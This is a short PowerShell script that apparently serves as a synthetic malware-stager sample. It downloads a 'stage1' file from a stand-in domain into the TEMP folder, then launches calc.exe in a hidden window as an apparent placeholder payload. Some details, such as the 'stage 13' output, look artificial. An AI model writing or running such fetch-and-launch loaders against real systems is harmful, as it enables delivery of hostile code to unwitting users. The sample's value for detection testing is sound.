
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$TargetUrl = "http://adatum.com/stage1.ps1",
    [string]$DownloadPath = "$env:TEMP\stage2.bin",
    [int]$ConnectionTimeout = 83
)
$ErrorActionPreference = "Stop"

function Get-Stage1Payload {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Beginning first stage"
$ResultObject = Get-Stage1Payload -SourceUrl $TargetUrl -DestinationPath $DownloadPath -TimeoutSec $ConnectionTimeout
if ($ResultObject) {
    Start-Process -FilePath "calc.exe" -WindowStyle Hidden
}
Write-Output "stage 13 initialized"
